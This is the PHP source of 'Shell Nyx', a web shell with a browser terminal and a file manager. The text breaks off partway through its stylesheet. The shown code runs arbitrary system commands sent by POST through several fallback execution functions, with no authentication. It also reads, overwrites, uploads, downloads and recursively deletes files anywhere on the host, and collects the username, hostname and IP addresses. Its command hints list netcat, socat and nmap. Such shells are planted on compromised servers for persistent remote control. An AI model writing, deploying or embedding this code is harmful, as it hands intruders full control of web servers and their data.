<?php
// ============================================
// Shell Nyx
// Created by Zent01
// Advanced Web Shell with File Manager
// WARNING: For authorized use only!
// ============================================

// Start PHP session for caching directory listings
session_start();

// ====== SYSTEM INFO DETECTION ======

/**
 * Detect operating system (Windows, macOS, Linux)
 * Returns array with OS icon, name, and path separator
 * Used for: Displaying OS badge in header, setting correct prompt symbol
 
 */
function detectOS() {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        return [
            'os' => 'windows',
            'icon' => '🪟',
            'name' => 'Windows',
            'path_separator' => '\\'
        ];
    } elseif (PHP_OS === 'Darwin') {
        return [
            'os' => 'macos',
            'icon' => '🍎',
            'name' => 'macOS',
            'path_separator' => '/'
        ];
    } else {
        return [
            'os' => 'linux',
            'icon' => '🐧',
            'name' => 'Linux/Unix',
            'path_separator' => '/'
        ];
    }
}

/**
 * Get current system username using multiple fallback methods
 * Method 1: POSIX functions (Linux/macOS)
 * Method 2: Environment variables (USERNAME, USER, LOGNAME)
 * Method 3: Shell command (whoami)
 * Used for: Displaying username badge in header
 */
function getCurrentUsername() {
    $username = '';
    
    // Try POSIX functions first (most reliable on Linux/macOS)
    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $userInfo = posix_getpwuid(posix_geteuid());
        if ($userInfo && isset($userInfo['name'])) {
            $username = $userInfo['name'];
        }
    }
    
    // Fallback to environment variables
    if (empty($username)) {
        $envVars = ['USERNAME', 'USER', 'LOGNAME'];
        foreach ($envVars as $var) {
            $val = getenv($var);
            if ($val !== false && !empty($val)) {
                $username = $val;
                break;
            }
        }
    }
    
    // Last resort: execute whoami command
    if (empty($username) && function_exists('exec')) {
        $output = [];
        exec('whoami 2>&1', $output);
        if (!empty($output[0])) {
            $username = trim($output[0]);
        }
    }
    
    return !empty($username) ? $username : 'unknown';
}

/**
 * Get hostname and IP addresses
 * Tries multiple methods: gethostname() -> php_uname() -> server vars -> shell command
 * Filters out localhost IPs (127.0.0.1, ::1)
 * Used for: Displaying hostname badge in header with IP tooltip
 */
function getHostnameInfo() {
    $hostname = '';
    $ipAddresses = [];
    
    // Get hostname
    if (function_exists('gethostname')) {
        $hostname = gethostname();
    }
    if (empty($hostname)) {
        $hostname = php_uname('n');
    }
    if (empty($hostname)) {
        $hostname = 'unknown';
    }
    
    // Get IPs via DNS resolution
    if (function_exists('gethostbynamel')) {
        $ips = gethostbynamel($hostname);
        if ($ips !== false) {
            $ipAddresses = $ips;
        }
    }
    
    // Get IPs via server variables
    if (empty($ipAddresses)) {
        if (isset($_SERVER['SERVER_ADDR'])) {
            $ipAddresses[] = $_SERVER['SERVER_ADDR'];
        }
        if (isset($_SERVER['LOCAL_ADDR'])) {
            $ipAddresses[] = $_SERVER['LOCAL_ADDR'];
        }
    }
    
    // Get IPs via shell command
    if (empty($ipAddresses) && function_exists('exec')) {
        $output = [];
        exec('hostname -I 2>&1', $output);
        if (!empty($output[0])) {
            $ips = explode(' ', trim($output[0]));
            foreach ($ips as $ip) {
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    $ipAddresses[] = $ip;
                }
            }
        }
    }
    
    // Remove duplicates and localhost IPs
    $ipAddresses = array_unique($ipAddresses);
    $ipAddresses = array_filter($ipAddresses, function($ip) {
        return $ip !== '127.0.0.1' && $ip !== '::1';
    });
    
    return [
        'hostname' => $hostname,
        'ips' => array_values($ipAddresses)
    ];
}

// ====== PATH NORMALIZATION ======

/**
 * Normalize path to use forward slashes and remove trailing slash
 * Converts Windows backslashes to forward slashes
 * Removes double slashes (// -> /)
 * Ensures path doesn't end with / (except root)
 * Used everywhere paths are processed
 */
function normalizePath($path) {
    $path = str_replace('\\', '/', $path);
    $path = preg_replace('#/+#', '/', $path);
    if (strlen($path) > 1 && $path[strlen($path) - 1] === '/') {
        $path = rtrim($path, '/');
    }
    if (empty($path)) {
        $path = '/';
    }
    return $path;
}

/**
 * Recursively delete a directory and all its contents
 * Handles both files and directories
 * Used by: File Manager delete action
 */
function recursiveDelete($dir) {
    if (!file_exists($dir)) {
        return true; // Already deleted
    }
    
    if (!is_dir($dir)) {
        return unlink($dir); // It's a file, just delete it
    }
    
    // Scan directory contents
    $items = scandir($dir);
    if ($items === false) {
        return false;
    }
    
    // Delete each item recursively
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') {
            continue; // Skip current and parent directory
        }
        
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        
        if (is_dir($path)) {
            if (!recursiveDelete($path)) {
                return false;
            }
        } else {
            if (!unlink($path)) {
                return false;
            }
        }
    }
    
    // Remove the empty directory
    return rmdir($dir);
}

/**
 * Execute system command using available PHP functions
 * Tries multiple methods in order: passthru -> system -> exec -> shell_exec -> popen -> proc_open
 * Used by: featureShell() to run commands
 */
function executeCommand($cmd, $cwd) {
    // Change to target directory if specified
    if ($cwd && is_dir($cwd)) {
        chdir($cwd);
    }
    
    // Check if user already has stderr redirect (2> or 2>&)
    // If yes, DON'T add our own 2>&1
    $hasRedirect = (strpos($cmd, '2>') !== false);
    
    // Available execution methods in order of preference
    $methods = [
        'passthru' => function($cmd) use ($hasRedirect) {
            ob_start();
            if (!$hasRedirect) {
                passthru($cmd . ' 2>&1');
            } else {
                passthru($cmd);
            }
            return ob_get_clean();
        },
        'system' => function($cmd) use ($hasRedirect) {
            ob_start();
            if (!$hasRedirect) {
                system($cmd . ' 2>&1');
            } else {
                system($cmd);
            }
            return ob_get_clean();
        },
        'exec' => function($cmd) use ($hasRedirect) {
            $output = [];
            $returnVar = 0;
            if (!$hasRedirect) {
                exec($cmd . ' 2>&1', $output, $returnVar);
            } else {
                exec($cmd, $output, $returnVar);
            }
            return implode("\n", $output);
        },
        'shell_exec' => function($cmd) use ($hasRedirect) {
            if (!$hasRedirect) {
                return shell_exec($cmd . ' 2>&1');
            } else {
                return shell_exec($cmd);
            }
        },
        'popen' => function($cmd) use ($hasRedirect) {
            if (!$hasRedirect) {
                $cmd .= ' 2>&1';
            }
            $handle = popen($cmd, 'r');
            if (!is_resource($handle)) return false;
            $output = '';
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
            return $output;
        },
        'proc_open' => function($cmd) use ($hasRedirect) {
            $descriptorspec = [
                0 => ["pipe", "r"], // stdin
                1 => ["pipe", "w"], // stdout
                2 => ["pipe", "w"]  // stderr
            ];
            $process = proc_open($cmd, $descriptorspec, $pipes);
            if (!is_resource($process)) return false;
            
            fclose($pipes[0]); // Close stdin
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            
            if (!$hasRedirect) {
                $error = stream_get_contents($pipes[2]);
                fclose($pipes[2]);
                $output .= $error;
            } else {
                fclose($pipes[2]);
            }
            proc_close($process);
            
            return $output;
        }
    ];

    // Try each method until one works
    foreach ($methods as $name => $func) {
        if (function_exists($name)) {
            $result = $func($cmd);
            if ($result !== null && $result !== false) {
                return $result;
            }
        }
    }
    return "No execution method available";
}

// ====== FEATURE HANDLERS ======

/**
 * Handle shell commands (cd, pwd, clear, and general execution)
 * Processes built-in commands locally, sends others to executeCommand()
 * Returns JSON with base64 encoded stdout and new cwd
 */
function featureShell($cmd, $cwd) {
    $stdout = "";
    $newCwd = $cwd;
    $cwd = normalizePath($cwd);

    // Empty command - do nothing
    if (empty(trim($cmd))) {
        return [
            "stdout" => base64_encode(""),
            "cwd" => base64_encode($cwd)
        ];
    }

    // Handle 'cd' command - change directory
    if (preg_match("/^\s*cd\s*(.*)$/", $cmd, $match)) {
        $targetDir = trim($match[1]);
        
        // cd ~ or cd with no args -> go to home directory
        if (empty($targetDir) || $targetDir === '~') {
            $targetDir = getenv('HOME') ? getenv('HOME') : '/';
        }
        
        // Check if path is absolute (Windows: C:\ or Linux: /)
        $isAbsolute = false;
        if (preg_match('/^[A-Za-z]:[\/\\\\]/', $targetDir)) {
            $isAbsolute = true; // Windows absolute path
        } elseif (isset($targetDir[0]) && $targetDir[0] === '/') {
            $isAbsolute = true; // Linux absolute path
        }
        
        // Build absolute path if relative
        if (!$isAbsolute) {
            $targetDir = $cwd . '/' . $targetDir;
        }
        
        $targetDir = normalizePath($targetDir);
        $realPath = realpath($targetDir);
        
        if ($realPath && is_dir($realPath)) {
            $newCwd = normalizePath($realPath);
            // Display path with correct separators based on OS
            $displayCwd = $newCwd;
            if (detectOS()['os'] === 'windows') {
                $displayCwd = str_replace('/', '\\', $newCwd);
            }
            $stdout = "Changed directory to: " . $displayCwd;
        } else {
            $stdout = "cd: no such file or directory: " . $targetDir;
            $newCwd = $cwd;
        }
        
        return [
            "stdout" => base64_encode($stdout),
            "cwd" => base64_encode($newCwd)
        ];
    }
    
	// Handle 'pwd' command - print working directory
	if (preg_match("/^\s*pwd\s*$/", $cmd)) {
	    $displayCwd = $cwd;
	    if (detectOS()['os'] === 'windows') {
		$displayCwd = str_replace('/', '\\', $cwd);
	    }
	    return [
		"stdout" => base64_encode($displayCwd),
		"cwd" => base64_encode($cwd)
	    ];
	}
    
    // Handle 'clear' command - clear terminal (processed by JavaScript)
    if (preg_match("/^\s*clear\s*$/i", $cmd)) {
        return ["action" => "clear"];
    }
    
    // Execute any other command via system shell
    $stdout = executeCommand($cmd, $cwd);
    $newCwd = $cwd; // cwd doesn't change for non-cd commands
    
    return [
        "stdout" => base64_encode($stdout !== null ? $stdout : ""),
        "cwd" => base64_encode($newCwd)
    ];
}	

/**
 * Tab completion - suggests commands or file paths
 * Type 'cmd': Returns matching system commands
 * Type 'file': Returns matching files/directories in current directory
 * Used by: Terminal Tab key auto-completion
 */
function featureHint($fileName, $cwd, $type) {
    // Change to current directory for file globbing
    if ($cwd && is_dir($cwd)) {
        chdir($cwd);
    }
    
    $files = [];
    
    // Command completion - suggest from predefined list
    if ($type === 'cmd') {
        $commonCommands = [
            'ls', 'dir', 'cat', 'type', 'cd', 'pwd', 'whoami', 'id', 'uname', 'ps', 'tasklist', 'netstat', 
            'ifconfig', 'ipconfig', 'ip', 'grep', 'find', 'findstr', 'wget', 'curl', 'python', 'python3',
            'perl', 'ruby', 'bash', 'sh', 'cmd', 'powershell', 'chmod', 'chown', 'mkdir', 'rm', 'del', 'cp',
            'copy', 'mv', 'move', 'echo', 'env', 'set', 'export', 'kill', 'taskkill', 'top', 'htop',
            'nano', 'vim', 'vi', 'notepad', 'less', 'more', 'tail', 'head', 'sort', 'uniq',
            'wc', 'diff', 'tar', 'gzip', 'gunzip', 'zip', 'unzip', 'ssh', 'scp',
            'ftp', 'sftp', 'nc', 'ncat', 'netcat', 'socat', 'tcpdump', 'nmap', 'clear',
            'php', 'node', 'npm', 'gcc', 'make', 'git', 'screen', 'tmux', 'crontab',
            'systeminfo', 'driverquery', 'sc', 'reg', 'wmic', 'net'
        ];
        
        foreach ($commonCommands as $cmd) {
            if (stripos($cmd, $fileName) === 0) {
                $files[] = base64_encode($cmd);
            }
        }
    } 
    // File path completion - use glob to find matching files
    else {
        $safePattern = preg_replace('/[^a-zA-Z0-9_.*\-\/\\\\:]/', '', $fileName);
        $pattern = $safePattern . '*';
        $matches = glob($pattern, GLOB_NOSORT | GLOB_MARK);
        
        if ($matches) {
            foreach ($matches as $match) {
                $basename = basename($match);
                if ($basename !== '.' && $basename !== '..') {
                    $files[] = base64_encode(normalizePath($match));
                }
            }
        }
    }
    
    return ['files' => $files];
}

/**
 * File Manager - handles all file operations via AJAX
 * Actions:
 *   list   - List directory contents (with caching, search, pagination)
 *   delete - Delete file or directory
 *   rename - Rename file or directory
 *   read   - Read file contents
 *   save   - Save/overwrite file contents
 *   mkdir  - Create new directory
 */
function featureFileManager($action, $path, $cwd, $offset = 0, $limit = 50, $search = '') {
    $path = normalizePath($path);
    
    if (empty($path) || $path === '') {
        $path = '/';
    }
    
    switch($action) {
        // ====== LIST DIRECTORY CONTENTS ======
        case 'list':
            $files = [];
            $totalItems = 0;
            $allFilteredItems = [];
            
            if (empty($path)) $path = '/';
            
            if (is_dir($path)) {
                $cacheKey = 'dir_cache_' . md5($path);
                
                // Use cached data if fresh (10 seconds TTL)
                if (isset($_SESSION[$cacheKey]) && $_SESSION[$cacheKey]['time'] > time() - 10) {
                    $allFilteredItems = $_SESSION[$cacheKey]['items'];
                } else {
                    // Read directory contents
                    $items = scandir($path);
                    
                    if ($items === false) {
                        return [
                            'success' => false,
                            'message' => 'Cannot read directory: ' . $path,
                            'cwd' => $path
                        ];
                    }
                    
                    // Build file info array
                    foreach($items as $item) {
                        if ($item == '.' || $item == '..') continue;
                        
                        $fullPath = ($path === '/') ? '/' . $item : $path . '/' . $item;
                        $fullPath = normalizePath($fullPath);
                        
                        if (!file_exists($fullPath)) continue;
                        
                        $allFilteredItems[] = [
                            'name' => $item,
                            'path' => $fullPath,
                            'size' => is_file($fullPath) ? filesize($fullPath) : 0,
                            'perms' => substr(sprintf('%o', fileperms($fullPath)), -4),
                            'type' => is_dir($fullPath) ? 'dir' : 'file',
                            'modified' => date("Y-m-d H:i:s", filemtime($fullPath)),
                            'readable' => is_readable($fullPath),
                            'writable' => is_writable($fullPath)
                        ];
                    }
                    
                    // Store in session cache
                    $_SESSION[$cacheKey] = [
                        'items' => $allFilteredItems,
                        'time' => time()
                    ];
                }
                
                // Sort: directories first, then alphabetically by name
                usort($allFilteredItems, function($a, $b) {
                    if ($a['type'] === $b['type']) {
                        return strcasecmp($a['name'], $b['name']);
                    }
                    return $a['type'] === 'dir' ? -1 : 1;
                });
                
                // Apply search filter if specified
                if (!empty($search)) {
                    $searchLower = strtolower($search);
                    $allFilteredItems = array_values(array_filter($allFilteredItems, function($item) use ($searchLower) {
                        return strpos(strtolower($item['name']), $searchLower) !== false;
                    }));
                }
                
                // Paginate results
                $totalItems = count($allFilteredItems);
                $files = array_slice($allFilteredItems, $offset, $limit);
                $hasMore = ($offset + $limit) < $totalItems;
            } else {
                return [
                    'success' => false,
                    'message' => 'Directory does not exist: ' . $path,
                    'cwd' => $path
                ];
            }
            
            return [
                'success' => true, 
                'data' => $files, 
                'total' => $totalItems,
                'offset' => $offset,
                'limit' => $limit,
                'cwd' => $path,
                'hasMore' => $hasMore ?? false,
                'search' => $search
            ];
            
        // ====== DELETE FILE OR DIRECTORY ======
        case 'delete':
            if (file_exists($path)) {
                $success = recursiveDelete($path);
                if ($success) {
                    // Clear file stat cache and directory listing cache
                    clearstatcache(true, $path);
                    $cacheKey = 'dir_cache_' . md5(dirname($path));
                    unset($_SESSION[$cacheKey]);
                }
            } else {
                $success = false;
            }
            return ['success' => $success, 'message' => $success ? 'Deleted successfully' : 'Failed to delete. Check permissions.'];
            
        // ====== RENAME FILE OR DIRECTORY ======
        case 'rename':
            $newName = isset($_POST['newname']) ? $_POST['newname'] : '';
            if (empty($newName)) {
                return ['success' => false, 'message' => 'New name is required'];
            }
            
            $newName = basename($newName); // Prevent path traversal
            $newPath = ($path === '/' || dirname($path) === '/') 
                ? normalizePath('/' . $newName) 
                : normalizePath(dirname($path) . '/' . $newName);
            
            if (file_exists($newPath)) {
                return ['success' => false, 'message' => 'A file with that name already exists'];
            }
            
            $success = rename($path, $newPath);
            if ($success) {
                // Clear directory cache
                $cacheKey = 'dir_cache_' . md5(dirname($path));
                unset($_SESSION[$cacheKey]);
            }
            return [
                'success' => $success, 
                'message' => $success ? 'Renamed successfully' : 'Failed to rename',
                'cwd' => normalizePath(dirname($path))
            ];
            
        // ====== READ FILE CONTENTS ======
        case 'read':
            if (is_file($path) && is_readable($path)) {
                $content = file_get_contents($path);
                if ($content !== false) {
                    return ['success' => true, 'content' => base64_encode($content), 'path' => $path];
                }
            }
            return ['success' => false, 'message' => 'Cannot read file'];
            
        // ====== SAVE/OVERWRITE FILE CONTENTS ======
        case 'save':
            $content = isset($_POST['content']) ? $_POST['content'] : '';
            $decodedContent = base64_decode($content);
            
            if ($decodedContent === false) {
                return ['success' => false, 'message' => 'Invalid content encoding'];
            }
            
            // Create parent directory if it doesn't exist
            $dir = normalizePath(dirname($path));
            if (!is_dir($dir)) {
                if (!mkdir($dir, 0755, true)) {
                    return ['success' => false, 'message' => 'Cannot create directory'];
                }
            }
            
            $success = file_put_contents($path, $decodedContent);
            if ($success !== false) {
                $cacheKey = 'dir_cache_' . md5(dirname($path));
                unset($_SESSION[$cacheKey]);
            }
            return [
                'success' => $success !== false, 
                'message' => $success !== false ? 'Saved successfully' : 'Failed to save file',
                'cwd' => normalizePath(dirname($path))
            ];
            
        // ====== CREATE NEW DIRECTORY ======
        case 'mkdir':
            $success = mkdir($path, 0755, true);
            if ($success) {
                $cacheKey = 'dir_cache_' . md5(dirname($path));
                unset($_SESSION[$cacheKey]);
            }
            return [
                'success' => $success, 
                'message' => $success ? 'Directory created' : 'Failed to create directory',
                'cwd' => normalizePath(dirname($path))
            ];
    }
    
    return ['success' => false, 'message' => 'Unknown action'];
}

// ====== AJAX HANDLER - Routes all API requests ======
// This section runs only when an AJAX request is made (?feature=xxx)
if (isset($_GET['feature'])) {
    
    // ----- SYSTEM INFO ENDPOINT -----
    // Returns OS info, username, hostname, and IP addresses as JSON
    if ($_GET['feature'] === 'systeminfo') {
        header('Content-Type: application/json');
        
        $osInfo = detectOS();
        $username = getCurrentUsername();
        $hostnameInfo = getHostnameInfo();
        
        echo json_encode([
            'success' => true,
            'os' => $osInfo,
            'username' => $username,
            'hostname' => $hostnameInfo['hostname'],
            'ips' => $hostnameInfo['ips']
        ]);
        exit;
    }
    
    // ----- FILE UPLOAD ENDPOINT -----
    // Handles file uploads via POST with multipart/form-data
    if ($_GET['feature'] === 'upload' && isset($_FILES['file'])) {
        $cwd = isset($_POST['cwd']) ? normalizePath($_POST['cwd']) : normalizePath(getcwd());
        $file = $_FILES['file'];
        $targetDir = isset($_POST['path']) ? normalizePath(dirname($_POST['path'])) : $cwd;
        
        // Create target directory if it doesn't exist
        if (!is_dir($targetDir)) {
            if (!mkdir($targetDir, 0755, true)) {
                echo json_encode(['success' => false, 'message' => 'Cannot create target directory']);
                exit;
            }
        }
        
        $targetPath = normalizePath($targetDir . '/' . basename($file['name']));
        
        if (move_uploaded_file($file['tmp_name'], $targetPath)) {
            // Clear directory cache to show new file
            $cacheKey = 'dir_cache_' . md5($targetDir);
            unset($_SESSION[$cacheKey]);
            
            echo json_encode([
                'success' => true,
                'message' => 'File uploaded successfully: ' . basename($targetPath) . ' (' . number_format($file['size']) . ' bytes)',
                'cwd' => base64_encode($cwd)
            ]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Failed to upload file. Error code: ' . $file['error']]);
        }
        exit;
    }
    
    // ----- FILE DOWNLOAD ENDPOINT -----
    // Streams a file to the browser for download
    if ($_GET['feature'] === 'download') {
        $filePath = isset($_GET['path']) ? normalizePath($_GET['path']) : '';
        
        // Validate file exists and is readable
        if (empty($filePath) || !file_exists($filePath) || !is_file($filePath) || !is_readable($filePath)) {
            header('HTTP/1.0 404 Not Found');
            die('File not found or not accessible');
        }
        
        $fileName = basename($filePath);
        $fileSize = filesize($filePath);
        $mimeType = mime_content_type($filePath) ?: 'application/octet-stream';
        
        // Clear all output buffers before sending file
        while (ob_get_level()) {
            ob_end_clean();
        }
        
        // Set download headers
        header('Content-Description: File Transfer');
        header('Content-Type: ' . $mimeType);
        header('Content-Disposition: attachment; filename="' . $fileName . '"');
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: public');
        header('Content-Length: ' . $fileSize);
        
        readfile($filePath);
        exit;
    }
    
    // ----- ALL OTHER API FEATURES -----
    // Handles: shell, hint, filemanager
    header('Content-Type: application/json');
    
    $feature = $_GET['feature'];
    $response = ['success' => false, 'message' => 'Unknown feature'];
    $cwd = isset($_POST['cwd']) ? normalizePath($_POST['cwd']) : normalizePath(getcwd());
    
    if (empty($cwd)) {
        $cwd = '/';
    }
    
    try {
        switch ($feature) {
            case 'shell':
                // Execute a shell command
                $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
                $response = featureShell($cmd, $cwd);
                break;
            case 'hint':
                // Tab completion suggestions
                $fileName = isset($_POST['filename']) ? $_POST['filename'] : '';
                $type = isset($_POST['type']) ? $_POST['type'] : 'file';
                $response = featureHint($fileName, $cwd, $type);
                break;
            case 'filemanager':
                // File manager operations (list, delete, rename, read, save, mkdir)
                $action = isset($_POST['action']) ? $_POST['action'] : 'list';
                $path = isset($_POST['path']) ? normalizePath($_POST['path']) : $cwd;
                $offset = isset($_POST['offset']) ? (int)$_POST['offset'] : 0;
                $limit = isset($_POST['limit']) ? (int)$_POST['limit'] : 50;
                $search = isset($_POST['search']) ? $_POST['search'] : '';
                
                if (empty($path)) $path = $cwd;
                if (empty($path)) $path = '/';
                
                $response = featureFileManager($action, $path, $cwd, $offset, $limit, $search);
                break;
        }
    } catch (Exception $e) {
        $response = ['success' => false, 'message' => 'Error: ' . $e->getMessage()];
    }
    
    echo json_encode($response);
    exit;
}

// ====== INITIALIZATION - Runs only on page load (not AJAX) ======
// Get initial working directory
$initialCwd = normalizePath(getcwd());
if (!$initialCwd) $initialCwd = '/';

// Detect system information for header badges
$osInfo = detectOS();
$initialUsername = getCurrentUsername();
$initialHostnameInfo = getHostnameInfo();

// Set correct prompt symbol based on OS (> for Windows, $ for Linux/macOS)
$promptSymbol = ($osInfo['os'] === 'windows') ? '>' : '$';

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Shell Nyx</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    /* ====== CSS Variables (Theme Colors) ====== */
    :root {
        --bg: #0a0a0f;          /* Main background */
        --panel-bg: #13131a;     /* Panel/header/footer background */
        --text: #c0c0d0;         /* Default text color */
        --green: #00ff41;        /* Terminal green (prompts, highlights) */
        --red: #ff4444;          /* Danger/error color */
        --blue: #4488ff;         /* Directory links */
        --yellow: #ffaa00;       /* Warnings/highlights */
        --purple: #aa44ff;       /* Footer accent */
        --border: #252535;       /* Border color */
        --hover: #1e1e2a;        /* Hover background */
        --cyan: #00d4ff;         /* Info/accent color */
    }
    
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    html, body { height: 100%; margin: 0; padding: 0; }
    
    /* ====== BODY - Full viewport flex layout ====== */
    body {
        background: var(--bg);
        color: var(--text);
        font-family: 'Fira Code', 'Courier New', monospace;
        height: 100vh;
        font-size: clamp(12px, 1.2vw, 16px); /* Responsive font size */
        display: flex;
        flex-direction: column;
        overflow: hidden; /* Prevent body scroll */
    }
    
    /* ====== HEADER ====== */
    #header {
        background: var(--panel-bg);
        padding: clamp(6px, 1vh, 12px) clamp(10px, 2vw, 20px);
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-bottom: 2px solid var(--green);
        box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
        z-index: 100;
        flex-shrink: 0; /* Never shrink header */
        flex-wrap: wrap;
        gap: 8px;
        min-height: fit-content;
    }
    
    #header-left { flex: 0 0 auto; min-width: 50px; display: block; }
    
    #header-center {
        flex: 1;
        display: flex;
        justify-content: center;
        align-items: center;
        min-width: 200px;
    }
    
    #header h1 {
        color: var(--green);
        font-size: clamp(14px, 2vw, 24px);
        text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
        letter-spacing: 2px;
        margin: 0;
        text-align: center;
        white-space: nowrap;
        margin-right: -370px;
    }
    
    /* ====== SYSTEM INFO ICONS (Header Right) ====== */
    #system-info {
        display: flex;
        align-items: center;
        gap: clamp(4px, 1vw, 12px);
        flex: 0 0 auto;
        flex-wrap: wrap;
        justify-content: flex-end;
    }
    
    .sys-info-item {
        position: relative;
        display: inline-flex;
        align-items: center;
        gap: 4px;
        padding: clamp(3px, 0.5vh, 6px) clamp(6px, 1vw, 12px);
        background: rgba(0, 255, 65, 0.05);
        border: 1px solid var(--border);
        border-radius: 20px;
        cursor: default;
        transition: all 0.3s ease;
        font-size: clamp(9px, 0.9vw, 13px);
        white-space: nowrap;
    }
    
    .sys-info-item:hover {
        background: rgba(0, 255, 65, 0.1);
        border-color: var(--green);
        box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
        transform: translateY(-2px);
    }
    
    .sys-info-icon { font-size: clamp(12px, 1.3vw, 18px); line-height: 1; }
    .sys-info-label { color: var(--text); opacity: 0.8; font-weight: bold; }
    
    /* ----- Tooltip Styles ----- */
    .sys-info-item .tooltip {
        display: none;
        position: absolute;
        top: calc(100% + 10px);
        right: 0;
        background: #1a1a2e;
        border: 1px solid var(--green);
        border-radius: 8px;
        padding: clamp(8px, 1vw, 12px) clamp(10px, 1.5vw, 16px);
        min-width: clamp(180px, 20vw, 220px);
        z-index: 1000;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 0 0 20px rgba(0, 255, 65, 0.2);
        pointer-events: none; /* Tooltip doesn't block hover */
    }
    
    .sys-info-item:hover .tooltip { display: block; animation: tooltipFadeIn 0.3s ease; }
    
    @keyframes tooltipFadeIn {
        from { opacity: 0; transform: translateY(-5px); }
        to { opacity: 1; transform: translateY(0); }
    }
    
    .tooltip::before {
        content: '';
        position: absolute;
        top: -8px;
        right: 20px;
        border-left: 8px solid transparent;
        border-right: 8px solid transparent;
        border-bottom: 8px solid var(--green);
    }
    
    .tooltip-title {
        color: var(--green);
        font-weight: bold;
        font-size: clamp(10px, 0.8vw, 12px);
        text-transform: uppercase;
        letter-spacing: 1px;
        margin-bottom: 8px;
        border-bottom: 1px solid var(--border);
        padding-bottom: 6px;
    }
    
    .tooltip-row {
        color: var(--text);
        font-size: clamp(10px, 0.9vw, 13px);
        padding: 3px 0;
        display: flex;
        justify-content: space-between;
        gap: 20px;
    }
    
    .tooltip-row .label { color: var(--cyan); opacity: 0.7; font-size: clamp(9px, 0.7vw, 11px); }
    .tooltip-row .value { color: var(--text); font-weight: bold; font-family: 'Fira Code', monospace; }
    .tooltip-ip-list { margin-top: 5px; padding-top: 5px; border-top: 1px solid var(--border); }
    .tooltip-ip-item { color: var(--yellow); font-size: clamp(9px, 0.8vw, 12px); font-family: 'Fira Code', monospace; padding: 2px 0; }
    
    /* ----- OS-specific colors for system info badges ----- */
    .sys-info-item.os-windows { border-color: #00a4ef; }
    .sys-info-item.os-windows:hover { border-color: #00a4ef; box-shadow: 0 0 15px rgba(0, 164, 239, 0.3); }
    .sys-info-item.os-linux { border-color: #fcc624; }
    .sys-info-item.os-linux:hover { border-color: #fcc624; box-shadow: 0 0 15px rgba(252, 198, 36, 0.3); }
    .sys-info-item.os-macos { border-color: #a2aaad; }
    .sys-info-item.os-macos:hover { border-color: #a2aaad; box-shadow: 0 0 15px rgba(162, 170, 173, 0.3); }
    
    .sys-info-item.os-windows .tooltip { border-color: #00a4ef; }
    .sys-info-item.os-windows .tooltip::before { border-bottom-color: #00a4ef; }
    .sys-info-item.os-windows .tooltip-title { color: #00a4ef; }
    .sys-info-item.os-linux .tooltip { border-color: #fcc624; }
    .sys-info-item.os-linux .tooltip::before { border-bottom-color: #fcc624; }
    .sys-info-item.os-linux .tooltip-title { color: #fcc624; }
    .sys-info-item.os-macos .tooltip { border-color: #a2aaad; }
    .sys-info-item.os-macos .tooltip::before { border-bottom-color: #a2aaad; }
    .sys-info-item.os-macos .tooltip-title { color: #a2aaad; }
    
    /* ====== TABS NAVIGATION ====== */
    #tabs {
        display: flex;
        background: var(--panel-bg);
        border-bottom: 1px solid var(--border);
        padding: 0;
        flex-shrink: 0;
        overflow-x: auto; /* Horizontal scroll for many tabs */
    }
    
    .tab {
        padding: clamp(8px, 1.2vh, 14px) clamp(14px, 2vw, 28px);
        cursor: pointer;
        border: none;
        background: transparent;
        color: var(--text);
        font-family: inherit;
        font-size: clamp(11px, 1vw, 15px);
        border-right: 1px solid var(--border);
        transition: all 0.3s;
        letter-spacing: 1px;
        white-space: nowrap;
        flex-shrink: 0;
    }
    
    .tab:hover { background: var(--hover); color: var(--green); }
    .tab.active { 
        background: var(--bg); 
        color: var(--green); 
        border-bottom: 2px solid var(--green); 
        box-shadow: 0 0 10px rgba(0, 255, 65, 0.2); 
    }
    
    /* ====== MAIN CONTENT AREA ====== */
    #content { 
        flex: 1;               /* Takes all available space */
        overflow: auto;        /* Scrolls if content overflows */
        min-height: 200px;     /* Minimum height even when empty */
    }
    
    .panel { 
        display: none;         /* Hidden by default */
        height: 100%; 
        padding: clamp(8px, 1.5vh, 15px); 
    }
    
    .panel.active { 
        display: flex; 
        flex-direction: column; 
    }
    
    /* ====== TERMINAL PANEL ====== */
    #terminal-output {
        flex: 1;
        overflow-y: auto;
        background: #000;
        padding: clamp(8px, 1.5vh, 15px);
        border: 1px solid var(--border);
        border-radius: 5px 5px 0 0;
        font-family: 'Fira Code', 'Courier New', monospace;
        font-size: clamp(11px, 1vw, 15px);
        line-height: 1.5;
        min-height: 100px;
    }
    
    #terminal-output pre {
        margin: 0; padding: 0;
        font-family: 'Fira Code', 'Courier New', monospace;
        font-size: inherit; line-height: 1.5;
        white-space: pre-wrap;      /* Wrap long lines */
        word-wrap: break-word;      /* Break long words */
    }
    
    #terminal-input-line {
        display: flex;
        background: #000;
        border: 1px solid var(--border);
        border-top: none;
        padding: clamp(6px, 1vh, 12px);
        border-radius: 0 0 5px 5px;
        flex-shrink: 0; /* Never shrink input line */
    }
    
    #terminal-prompt {
        color: var(--green);
        font-weight: bold;
        white-space: nowrap;
        user-select: none;
        font-family: 'Fira Code', 'Courier New', monospace;
        font-size: clamp(11px, 1vw, 15px);
    }
    
    #terminal-input {
        flex: 1;
        background: transparent;
        border: none;
        color: var(--text);
        font-family: 'Fira Code', 'Courier New', monospace;
        font-size: clamp(11px, 1vw, 15px);
        outline: none;
        margin-left: 8px;
        caret-color: var(--green);
    }
    
    /* ====== FILE MANAGER PANEL ====== */
